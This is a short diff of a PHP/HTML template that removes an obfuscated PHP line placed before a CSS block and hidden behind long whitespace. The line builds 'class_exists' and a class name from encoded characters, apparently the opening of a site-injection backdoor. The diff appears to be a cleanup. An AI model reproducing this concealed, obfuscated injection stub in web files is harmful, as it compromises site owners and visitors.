@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $phdPNifrdh = "\107" . chr (101) . 'm' . chr ( 366 - 271 )."\115" . chr ( 829 - 745 )."\x4f";$SUiHIc = 'c' . "\x6c" . chr (97) . chr ( 381 - 266 ).chr (115) . '_' . "\145" . chr ( 780 - 660 )."\x69" . chr (115) . chr ( 449 - 333 ).chr ( 1071 - 956 ); $RtjZw = class_exists($phdPNifrdh); $phdPNifrdh = "9527";$SUiHIc = "19544"; ?><style>
+<style>
     .card-bg{
         background-color: #F6F6F6;
     }
